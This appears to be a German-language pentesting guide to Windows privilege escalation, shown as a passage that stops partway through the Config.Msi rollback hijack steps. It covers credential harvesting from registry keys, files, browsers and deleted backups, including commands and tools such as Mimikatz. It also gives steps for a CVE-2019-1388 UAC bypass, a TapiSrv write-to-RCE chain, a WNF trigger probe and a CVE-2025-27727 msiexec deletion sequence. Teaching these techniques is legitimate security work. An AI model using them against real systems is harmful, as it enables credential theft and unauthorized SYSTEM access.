Prüfe zugängliche Einträge im Papierkorb auf gelöschte Backups und Konfigurationsarchive sowie auf Dateien, deren Namen ausdrücklich auf Zugangsdaten hinweisen. Ein nützliches `.7z`-, `.zip`- oder `.rar`-Backup kann Monate alt sein und einen gewöhnlichen Dateinamen haben. Windows speichert den ursprünglichen Pfad und den Löschzeitpunkt in einem `$I`-Eintrag und die gelöschte Datei als zugehörigen `$R`-Eintrag. Prüfe die Metadaten und den Lesezugriff der aktuellen Identität, bevor du ein Archiv öffnest. Die Sichtbarkeit hängt vom Volume, der Benutzer-SID und den Dateiberechtigungen ab. Eine leere Auflistung beweist daher nicht, dass kein wiederherstellbares Backup vorhanden ist. Betrachte einen Archivnamen als Kandidaten für eine Überprüfung, nicht als Beweis dafür, dass er ein gültiges Geheimnis enthält.

Eine zugängliche gelöschte `.pfx`-Datei kann auch ein Hinweis auf **Code-Signing** sein. Wenn sie einen zugänglichen privaten Schlüssel enthält, kann dieser zum Signieren eines geänderten PowerShell-Skripts verwendet werden. [PowerShell erfordert ein Code-Signing-Zertifikat mit privatem Schlüssel](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), und [AppLocker-Publisherregeln werten die Identität des Signierenden und den Regelbereich aus](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Eine kontenübergreifende Ausführung setzt voraus, dass die aktuelle Identität das konkrete Skript ändern kann, eine wirksame Regel die resultierende Signatur für das Skript und das Zielkonto akzeptiert und eine geplante Aufgabe oder ein anderer Prozess mit höheren Berechtigungen das Skript tatsächlich ausführt. Ein `.pfx`-Dateiname, ein Zertifikatsbetreff oder ein beschreibbares Skript allein belegt diese Kette nicht. Prüfe Metadaten, ACLs, Richtlinien und den geplanten Befehl, bevor du privates Schlüsselmaterial öffnest oder die Aufgabe auslöst.

Prüfe außerdem zugängliche Profildatenbanken von Messaging-Clients, Notizen und empfangene Dateien auf Hinweise auf Zugangsdaten. Ein BitLocker-Wiederherstellungsschlüsselexport kann als HTML- oder TXT-Datei gespeichert sein, manchmal in einem benannten Backup-Archiv. Solches Material kann Zugriff auf ein separates verschlüsseltes Datenvolume ermöglichen, das ältere Backups enthält. Untersuche das Volume und das Archiv nur, wenn der Zugriff autorisiert ist. Wenn ein Backup `NTDS.dit` enthält, erfordert die Offline-Wiederherstellung von Domänenzugangsdaten auch die passende `SYSTEM`-Hive, wie im [Backup and privileged-groups workflow](../active-directory-methodology/privileged-groups-and-token-privileges.md) beschrieben. Dateinamen und ein gesperrtes Volume allein belegen nicht, dass ein verwendbarer Wiederherstellungsschlüssel oder ein Domänenbackup existiert.

Um in mehreren Programmen gespeicherte **Passwörter wiederherzustellen**, kannst du Folgendes verwenden: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### In der Registrierung

**Weitere mögliche Registrierungsschlüssel mit Zugangsdaten**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**OpenSSH-Schlüssel aus der Registry extrahieren.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browserverlauf

Du solltest nach Datenbanken suchen, in denen Passwörter aus **Chrome oder Firefox** gespeichert sind.\
Du solltest nach Datenbanken suchen, in denen Passwörter aus **Chrome, Edge oder Firefox** gespeichert sind.\
Prüfe auch den Verlauf, die Lesezeichen und die Favoriten der Browser, da dort möglicherweise **Passwörter gespeichert sind**.

Beim standardmäßigen **Default**-Profil von Edge des aktuellen Benutzers befindet sich `Login Data` unter `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, während `Local State` im übergeordneten Verzeichnis `User Data` liegt. [Microsoft dokumentiert den Standardspeicherort des Profils](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); ein anderes Profil oder eine `UserDataDir`-Richtlinie kann den Speicherort ändern. Das Vorhandensein der Dateien ist lediglich ein Hinweis auf einen möglichen Speicherort von Anmeldedaten: Prüfe, ob die Dateien lesbar sind, ob der DPAPI-Kontext des betreffenden Benutzers oder anderes autorisiertes Schlüsselmaterial verfügbar ist und ob ein gespeicherter Login zu einem privilegierteren Konto gehört. Eine reine Pfad-Auflistung muss die Datenbank weder öffnen noch entschlüsselte Passwörter ausgeben.

Für Firefox dokumentiert [Mozilla](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile), dass `key4.db` und `logins.json` eines Profils die zusammengehörigen Schlüssel- und Dateien mit verschlüsselten Anmeldedaten sind. Ihr Vorhandensein ist lediglich ein Hinweis: Prüfe, ob beide Dateien lesbar sind, ob gespeicherte Einträge vorhanden sind und ob ein Primary Password den Schlüssel schützt, bevor du zu dem Schluss kommst, dass die Anmeldedaten verwendet werden können. Wenn ein wiederhergestellter Anmeldenachweis zu einem Domänenkonto gehört, prüfe die effektiven Gruppensteuerungsrechte dieses Kontos und die [LAPS-Berechtigungen der Gruppe zum Lesen oder Entschlüsseln von Passwörtern](../active-directory-methodology/laps.md) separat; Browser-Artefakte allein belegen keinen Pfad zu Administratorrechten.

Tools zum Extrahieren von Passwörtern aus Browsern:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** ist eine in das Windows-Betriebssystem integrierte Technologie, die die **Kommunikation** zwischen Softwarekomponenten in verschiedenen Sprachen ermöglicht. Jede COM-Komponente wird **anhand einer Klassen-ID (CLSID) identifiziert**, und jede Komponente stellt Funktionen über eine oder mehrere Schnittstellen bereit, die anhand von Schnittstellen-IDs (IIDs) identifiziert werden.

COM-Klassen und -Schnittstellen werden in der Registry unter **HKEY\CLASSES\ROOT\CLSID** beziehungsweise **HKEY\CLASSES\ROOT\Interface** definiert. Diese Registry entsteht durch das Zusammenführen von **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Innerhalb der CLSIDs dieser Registry findest du den untergeordneten Registry-Schlüssel **InProcServer32**, der einen **Standardwert** enthält, der auf eine **DLL** verweist, sowie einen Wert namens **ThreadingModel**, der **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single- oder Multi-Threaded) oder **Neutral** (Thread Neutral) sein kann.

![Browserverlauf - COM DLL Overwriting: Innerhalb der CLSIDs dieser Registry findest du den untergeordneten Registry-Schlüssel InProcServer32, der einen Standardwert enthält, der auf eine DLL verweist, sowie einen Wert...](<../../images/image (729).png>)

Wenn du **eine der auszuführenden DLLs überschreiben** kannst, könntest du deine **Berechtigungen erweitern**, sofern diese DLL von einem anderen Benutzer ausgeführt wird.

Weitere Informationen dazu, wie Angreifer COM Hijacking als Persistenzmechanismus nutzen, findest du hier:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Allgemeine Suche nach Passwörtern in Dateien und der Registry**

**Dateiinhalte durchsuchen**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Nach einer Datei mit einem bestimmten Dateinamen suchen**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Durchsuche die Registry nach Schlüsselnamen und Passwörtern**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Tools zum Suchen nach Passwörtern

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ist ein msf**-Plugin, das ich erstellt habe, um **automatisch jedes Metasploit-POST-Modul auszuführen, das im Opfer nach Zugangsdaten sucht**.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) sucht automatisch nach allen Dateien, die die auf dieser Seite erwähnten Passwörter enthalten.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ist ein weiteres großartiges Tool, um Passwörter aus einem System auszulesen.

Das Tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) sucht nach **Sessions**, **Benutzernamen** und **Passwörtern** verschiedener Tools, die diese Daten im Klartext speichern (PuTTY, WinSCP, FileZilla, SuperPuTTY und RDP).

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Stell dir vor, **ein als SYSTEM laufender Prozess öffnet einen neuen Prozess** (`OpenProcess()`) mit **vollständigem Zugriff**. Derselbe Prozess **erstellt außerdem einen neuen Prozess** (`CreateProcess()`) **mit niedrigen Berechtigungen, der jedoch alle offenen Handles des Hauptprozesses erbt**.\
Wenn du dann **vollen Zugriff auf den Prozess mit niedrigen Berechtigungen hast**, kannst du das **offene Handle zum privilegierten Prozess**, das mit `OpenProcess()` erstellt wurde, abgreifen und **Shellcode injizieren**.\
[Lies dieses Beispiel, um mehr darüber zu erfahren, **wie du diese Schwachstelle erkennst und ausnutzt**.](leaked-handle-exploitation.md)\
[Lies auch [diesen Beitrag für eine ausführlichere Erklärung, wie du weitere offene Handles von Prozessen und Threads testest und missbrauchst, die mit verschiedenen Berechtigungsstufen vererbt wurden (nicht nur mit vollem Zugriff)](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Gemeinsam genutzte Speichersegmente, sogenannte **Pipes**, ermöglichen die Prozesskommunikation und den Datentransfer.

Windows bietet eine Funktion namens **Named Pipes**, mit der nicht zusammengehörige Prozesse Daten gemeinsam nutzen können, sogar über verschiedene Netzwerke hinweg. Dies ähnelt einer Client/Server-Architektur, bei der die Rollen als **Named-Pipe-Server** und **Named-Pipe-Client** definiert sind.

Wenn ein **Client** Daten über eine Pipe sendet, kann der **Server**, der die Pipe eingerichtet hat, **die Identität des Clients annehmen**, sofern er über die erforderlichen **SeImpersonate**-Rechte verfügt. Wenn du einen **privilegierten Prozess** identifizierst, der über eine Pipe kommuniziert, die du nachahmen kannst, bietet sich dir die Möglichkeit, **höhere Berechtigungen zu erlangen**, indem du die Identität dieses Prozesses annimmst, sobald er mit der von dir eingerichteten Pipe interagiert. Anleitungen zur Durchführung eines solchen Angriffs findest du [**hier**](named-pipe-client-impersonation.md) und [**hier**](#from-high-integrity-to-system).

Mit dem folgenden Tool kannst du außerdem **die Kommunikation über eine Named Pipe mit einem Tool wie Burp abfangen:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **Mit diesem Tool kannst du alle Pipes auflisten und anzeigen, um Privescs zu finden:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Der Telephony-Dienst (TapiSrv) stellt im Servermodus `\\pipe\\tapsrv` (MS-TRP) bereit. Ein entfernter, authentifizierter Client kann den auf Mailslots basierenden asynchronen Ereignispfad missbrauchen, um `ClientAttach` in einen beliebigen **4-Byte-Schreibvorgang** in jede vorhandene Datei umzuwandeln, auf die `NETWORK SERVICE` Schreibzugriff hat. Anschließend kann er Telephony-Administratorrechte erlangen und eine beliebige DLL als Dienst laden. Der vollständige Ablauf:

- `ClientAttach` mit `pszDomainUser`, das auf einen beschreibbaren, vorhandenen Pfad gesetzt ist → der Dienst öffnet die Datei mit `CreateFileW(..., OPEN_EXISTING)` und verwendet sie für asynchrone Ereignisschreibvorgänge.
- Jedes Ereignis schreibt den vom Angreifer kontrollierten Wert `InitContext` aus `Initialize` in diesen Handle. Registriere eine Line-App mit `LRegisterRequestRecipient` (`Req_Func 61`), löse `TRequestMakeCall` aus (`Req_Func 121`), rufe die Daten mit `GetAsyncEvents` ab (`Req_Func 0`) und hebe dann die Registrierung auf bzw. fahre den Dienst herunter, um die deterministischen Schreibvorgänge zu wiederholen.
- Füge dich in `C:\Windows\TAPI\tsec.ini` zu `[TapiAdministrators]` hinzu, verbinde dich erneut und rufe `GetUIDllName` mit einem beliebigen DLL-Pfad auf, um `TSPI_providerUIIdentify` als `NETWORK SERVICE` auszuführen.

Weitere Details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Sonstiges

### Dateierweiterungen, die unter Windows ausführbare Inhalte enthalten können

Sieh dir die Seite **[https://filesec.io/](https://filesec.io/)** an.

### Missbrauch von Protocol Handlern / ShellExecute über Markdown-Renderer

An `ShellExecuteExW` weitergeleitete, anklickbare Markdown-Links können gefährliche URI-Handler (`file:`, `ms-appinstaller:` oder ein anderes registriertes Schema) auslösen und vom Angreifer kontrollierte Dateien als aktueller Benutzer ausführen. Siehe:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Befehlszeilen auf Passwörter überwachen**

Wenn du eine Shell als Benutzer erhältst, kann es sein, dass geplante Tasks oder andere Prozesse ausgeführt werden, die **Anmeldedaten in der Befehlszeile übergeben**. Das folgende Skript erfasst alle zwei Sekunden die Befehlszeilen der Prozesse, vergleicht den aktuellen Zustand mit dem vorherigen und gibt alle Unterschiede aus.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Passwörter aus Prozessen stehlen

## Vom Low Priv User zu NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Wenn du Zugriff auf die grafische Oberfläche hast (über die Konsole oder RDP) und UAC aktiviert ist, ist es in einigen Versionen von Microsoft Windows möglich, ein Terminal oder einen anderen Prozess als „NT\AUTHORITY SYSTEM“ von einem unprivilegierten Benutzer auszuführen.

Dadurch ist es möglich, mit derselben Schwachstelle gleichzeitig die Berechtigungen zu erweitern und UAC zu umgehen. Außerdem muss nichts installiert werden, und die während des Vorgangs verwendete Binärdatei ist von Microsoft signiert und herausgegeben.

Zu den betroffenen Systemen gehören unter anderem:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Um diese Schwachstelle auszunutzen, müssen die folgenden Schritte ausgeführt werden:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Sie finden alle erforderlichen Dateien und Informationen im folgenden GitHub-Repository:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Von Administrator-Integritätsstufe „Medium“ zu „High“ / UAC Bypass

Lesen Sie dies, um mehr über **Integritätsstufen** zu erfahren:


{{#ref}}
integrity-levels.md
{{#endref}}

Lesen Sie anschließend dies, um mehr über UAC und UAC Bypasses zu erfahren:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Upload-Verzeichnis-Junctions in ein bereitgestelltes Stammverzeichnis

Eine Anwendung kann ein vorhersehbares Upload-Unterverzeichnis erstellen, einen vom Aufrufer angegebenen Dateinamen darin speichern und die Datei anschließend verarbeiten. Wenn ein Benutzer mit niedrigen Berechtigungen dieses Unterverzeichnis entfernen und durch eine NTFS-Junction ersetzen kann, bevor der serverseitige Schreibvorgang erfolgt, kann der Schreibvorgang der Junction in ein über das Web bereitgestelltes Verzeichnis folgen. Ein dort abgelegtes Skript kann mit der Identität des Webdienstes ausgeführt werden, sofern der Server diesen Dateityp ausführt. Dies ist eine anwendungsspezifische Grenze für beliebige Schreibvorgänge; ein beschreibbares Upload-Verzeichnis oder eine vorhandene Junction allein belegt dies nicht.

Prüfen Sie die genaue Pfadbildung und den Zeitpunkt im Upload-Handler, die effektiven Rechte des Benutzers zum Löschen und Erstellen des Unterverzeichnisses, die effektiven ACLs des Zielverzeichnisses, ob der Schreibvorgang Reparse Points folgt und ob der Webserver Dateien in diesem Zielverzeichnis ausführt. Bestätigen Sie die Prozessidentitäten des Schreibprozesses und des Webservers getrennt. Eine passive Bestandsaufnahme kann Verzeichnis-ACLs und Reparse-Metadaten anzeigen, aber weder das Verhalten des Handlers noch einen künftigen Austausch der Junction feststellen. Wenn die Ausführung im Kontext eines Dienstkontos erfolgt, untersuchen Sie den **tatsächlichen Prozesstoken**, bevor Sie einen separaten Weg über Token-Berechtigungen in Betracht ziehen.

## Durch WNF ausgelöste Bereinigung privilegierter geplanter Aufgaben

Eine geplante Aufgabe, die eine manuelle Ausführung verweigert, kann dennoch einen nicht privilegierten Trigger bieten. Exportieren Sie beim Überprüfen einer privilegierten Aufgabe deren XML und untersuchen Sie **alle** Trigger sowie die DACL, den Prinzipal und die Aktion der Aufgabe. Insbesondere benennt ein `WnfStateChangeTrigger` einen Windows Notification Facility (WNF)-Status. Wenn dieser sicherbare Status dem aktuellen Benutzer das Veröffentlichen einer Aktualisierung erlaubt, kann der Benutzer die Aufgabe indirekt unter der konfigurierten Identität starten, obwohl `<AllowStartOnDemand>false</AllowStartOnDemand>` gesetzt ist.<sup>[[43]](#references)</sup>

Beispielsweise lief die Recall-Aufgabe `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` als SYSTEM, akzeptierte Aktualisierungen des WNF-Status `7508BCA32C079E41` von einem Standardbenutzer und prüfte anschließend `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}`, selbst wenn Recall deaktiviert war.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Um die Erreichbarkeit zu testen, löse `ZwUpdateWnfStateData` aus `ntdll.dll` auf, übermittle ein leeres Update für den acht Byte langen Zustandsnamen und gleiche den Rückgabestatus mit den Daten zur letzten Ausführung der Aufgabe oder den Procmon-Aktivitäten ab. Die folgende verkürzte Probe verwendet die Bytefolge aus dem Recall-Aufgabenbeispiel; ersetze sie durch die für die zu testende Aufgabe exportierten Bytes.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Rekursive Bereinigung in privilegiertes Löschen umwandeln

Der entscheidende Primitive ist nicht allein der Trigger, sondern eine privilegierte Bereinigungsroutine, die ein vom Angreifer kontrolliertes Verzeichnis akzeptiert. Verfolge den Vorgang von der Aufzählung bis zur abschließenden Änderung: Die Suche nach Profilen/Sitzungen, per Wildcard ausgewählte untergeordnete Elemente, `SHCreateItemFromParsingName` und `IFileOperation::DeleteItem` sind starke Indikatoren dafür, dass ein zuvor überprüfter Pfad später rekursiv durchlaufen wird. Werden Nachfahren nicht relativ zu vertrauenswürdigen Verzeichnis-Handles geöffnet und vor dem Löschen überprüft, kann ein Angreifer die Pfadauflösung zwischen Aufzählung und Verwendung ändern.<sup>[[43]](#references)</sup>

Kombiniere den WNF-Trigger mit der unten beschriebenen [oplock-, Junction- und Object-Manager-Symlink-Substitution](#from-folder-contents-delete-to-system-eop): Der oplock pausiert die Bereinigungsroutine, nachdem sie das legitime untergeordnete Element ausgewählt hat. Währenddessen wird der beschreibbare übergeordnete Pfad ersetzt, sodass das fortgesetzte privilegierte Löschen über `\RPC Control` auf das geschützte Ziel aufgelöst wird. In der Recall-Kette führte dies zum Löschen von `C:\Config.Msi` durch SYSTEM, das für die dokumentierte MSI-Rollback-Technik erforderlich war.<sup>[[31]](#references)[[43]](#references)</sup>

### Verschachtelte Nachfahren umgehen oberflächliche Reparse-Point-Korrekturen

Nur die vom Angreifer kontrollierte Wurzel und ihr unmittelbares untergeordnetes Element zu überprüfen, schützt nicht vor einem rekursiven pfadbasierten Löschen. Belasse diese überprüften Objekte unverändert und verlagere die Junction-/oplock-Substitution in ein zusätzliches untergeordnetes Element darunter. `IFileOperation::DeleteItem` erreicht schließlich den nicht überprüften Nachfahren und folgt dessen neuem Ziel. CVE-2026-20941 entstand genau durch diese Art unvollständiger Korrektur: Der erste Recall-Patch überprüfte `UKP` und das GUID-förmige Verzeichnis, behielt aber den bisherigen rekursiven Löschvorgang bei.<sup>[[43]](#references)</sup>

Das sichere Muster besteht darin, **jeden Nachfahren** relativ zu einem bereits vertrauenswürdigen Verzeichnis-Handle zu öffnen, den endgültig aufgelösten Pfad/das endgültige Objekt abzurufen und zu überprüfen und den Löschvorgang auf dieses überprüfte Handle anzuwenden. Überprüfe nicht nur ein Präfix und kehre anschließend zum rekursiven pfadbasierten Löschen zurück. Untersuche bei der Patch-Überprüfung außerdem die Strukturen am tatsächlichen Aufrufort: In diesem Fall zeigte die Laufzeitprüfung von `OBJECT_ATTRIBUTES` bei `NtCreateFile` ein nicht-null `RootDirectory` und einen relativen Namen `{GUID}\\secure_file.lock`. Damit wurde die irreführende Decompiler-Ausgabe widerlegt, die auf ein zweites `FILE_DELETE_ON_CLOSE`-Primitive hindeutete.<sup>[[43]](#references)</sup>

## Beliebige Ordner löschen/verschieben/umbenennen zu SYSTEM-EoP

Die in [**diesem Blogbeitrag**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) beschriebene Technik mit einem [**hier verfügbaren**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs) Exploit-Code.<sup>[[31]](#references)[[32]](#references)</sup>

Bei dem Angriff wird im Wesentlichen die Rollback-Funktion von Windows Installer missbraucht, um während der Deinstallation legitime Dateien durch schädliche zu ersetzen. Dazu muss der Angreifer einen **schädlichen MSI-Installer** erstellen, mit dem der Ordner `C:\Config.Msi` gekapert wird. Windows Installer verwendet diesen später, um während der Deinstallation anderer MSI-Pakete Rollback-Dateien abzulegen. Diese Rollback-Dateien werden so verändert, dass sie die schädliche Payload enthalten.

### Windows Installer: Einschleusen eines COM-Bereinigungspfads (CVE-2025-27727)

Ein Client mit niedrigen Berechtigungen kann über das COM-Objekt `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`) den SYSTEM-Dienst `msiexec.exe` erreichen. Beim Reverse Engineering wurden die relevanten `IMsiServer`-Aufrufe als `MsiBeginTransactionW` am vtable-Offset `0xA0`, `SetEEUIDirectoryAndFilter` bei `0xC8` und `CleanupTempPackages` bei `0x50` identifiziert. Diese Namen und Offsets wurden durch Reverse Engineering ermittelt und können sich je nach Build unterscheiden.<sup>[[41]](#references)</sup>

Bei einem Benutzer ohne Administratorrechte impersoniert `SetEEUIDirectoryAndFilter` den Aufrufer nur während des Öffnens des angegebenen Pfads mit `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` und `FILE_FLAG_OPEN_REPARSE_POINT`. Damit wird nachgewiesen, dass der Aufrufer das Verzeichnis löschen kann, und verhindert, dass einem Reparse Point gefolgt wird. Es wird jedoch **weder** das überprüfte Dateiobjekt an die spätere Bereinigung gebunden **noch** nachgewiesen, dass Windows Installer es erstellt hat.<sup>[[41]](#references)</sup>

Nach `MsiBeginTransactionW` plant `SetEEUIDirectoryAndFilter` den Pfad unabhängig vom Filterargument des Aufrufers als Ordner ein. Der Dienst schreibt unter `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages` einen benannten `REG_DWORD`-Wert: Der Wertname ist der vom Aufrufer kontrollierte Pfad und der Wert `0x00000002` kennzeichnet den Ordner. `CleanupTempPackages(NULL, FALSE)` startet anschließend direkt die Bereinigung. Der erhöhte Worker zählt die Registrierungswerte auf und übergibt Ordnereinträge an `FDeleteFolder`, das rekursiv löscht, ohne die Herkunft des Pfads zu überprüfen. Schlägt das normale Entfernen fehl, ruft der Code außerdem `LockdownPath` auf, löscht die Dateiattribute und versucht es erneut.<sup>[[41]](#references)</sup>

Die minimale, aus `msi.dll` ermittelte Aufrufsequenz lautet:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Das nützliche Primitive ist die Wiederverwendung eines Pfads und nicht eine Junction-Umleitung. Registriere ein vom Angreifer erstelltes `C:\Config.Msi`, entferne es und lass Windows Installer später denselben Pfad mit geschützten Rollback-Daten erneut erstellen. Die Bereinigung vertraut dem veralteten Namen `TempPackages` und löscht das neue Verzeichnis als SYSTEM. Damit wird die vorgesehene Grenze umgangen, die `FILE_FLAG_OPEN_REPARSE_POINT` und die Mitigation für das Vertrauen in Umleitungen schaffen sollen, denn ein Reparse Point ist nicht erforderlich.<sup>[[41]](#references)</sup>

Dieses Lösch-Primitive passt in die folgende Rollback-Kette: Bewahre den separaten `Installer\Folders`-Eintrag auf, lösche das geschützte `C:\Config.Msi`, erstelle es mit einer NULL-DACL neu und behalte ein Handle mit `WRITE_DAC`, bevor der Installer die DACL absichert. Das vorab geöffnete Handle kann mit `NtSetSecurityObject` eine permissive DACL wiederherstellen. Danach lässt sich die generierte `.rbs` ersetzen, bevor das Rollback fortgesetzt wird.<sup>[[41]](#references)</sup>

Microsoft hat den Pfad korrigiert, indem verhindert wird, dass `CMsiTransaction::SetEEUIDirectoryAndFilter` `ScheduleFileOrFolderDelete` aufruft, wenn das neue Feature-Gate aktiviert ist. Der COM-Aufruf kann weiterhin Erfolg melden, trägt den vom Angreifer kontrollierten Pfad aber nicht mehr in `TempPackages` ein. Installiere die Windows-Sicherheitsupdates vom April 2025, statt den Erfolg des Methodenaufrufs als Patch-Test zu verwenden.<sup>[[41]](#references)[[42]](#references)</sup>

Die zusammengefasste Technik sieht wie folgt aus:

1. **Phase 1 – Vorbereitung des Hijacks (`C:\Config.Msi` leer lassen)**

- Schritt 1: MSI installieren
    - Erstelle eine `.msi`, die eine harmlose Datei (z. B. `dummy.txt`) in einem beschreibbaren Ordner (`TARGETDIR`) installiert.
    - Markiere den Installer als **„UAC Compliant“**, damit ein **Nicht-Admin-Benutzer** ihn ausführen kann.
    - Halte nach der Installation ein **Handle** für die Datei offen.

- Schritt 2: Deinstallation starten
    - Deinstalliere dieselbe `.msi`.
    - Der Deinstallationsprozess beginnt, Dateien nach `C:\Config.Msi` zu verschieben und sie in `.rbf`-Dateien (Rollback-Backups) umzubenennen.
    - **Überwache das offene Datei-Handle** mit `GetFinalPathNameByHandle`, um zu erkennen, wann die Datei zu `C:\Config.Msi\<random>.rbf` wird.

- Schritt 3: Benutzerdefinierte Synchronisierung
    - Die `.msi` enthält eine **benutzerdefinierte Deinstallationsaktion (`SyncOnRbfWritten`)**, die:
        - signalisiert, sobald die `.rbf` geschrieben wurde.
        - Dann auf ein weiteres Ereignis **wartet**, bevor die Deinstallation fortgesetzt wird.

- Schritt 4: Löschen der `.rbf` verhindern
    - Wenn das Signal eingeht, **öffne die `.rbf`-Datei** ohne `FILE_SHARE_DELETE` – dadurch **wird sie vor dem Löschen geschützt**.
    - Sende dann ein **Signal zurück**, damit die Deinstallation abgeschlossen werden kann.
    - Windows Installer kann die `.rbf` nicht löschen. Da er nicht alle Inhalte löschen kann, wird **`C:\Config.Msi` nicht entfernt**.

- Schritt 5: `.rbf` manuell löschen
    - Lösche (als Angreifer) die `.rbf`-Datei manuell.
    - Jetzt ist **`C:\Config.Msi` leer** und bereit für den Hijack.

> An diesem Punkt kannst du die SYSTEM-anfällige Schwachstelle zum Löschen beliebiger Ordner auslösen, um `C:\Config.Msi` zu löschen.

2. **Phase 2 – Rollback-Skripte durch bösartige Skripte ersetzen**

- Schritt 6: `C:\Config.Msi` mit schwachen ACLs neu erstellen
    - Erstelle den Ordner `C:\Config.Msi` selbst neu.
    - Setze **schwache DACLs** (z. B. Everyone:F) und **behalte ein Handle mit `WRITE_DAC` offen**.

- Schritt 7: Eine weitere Installation ausführen
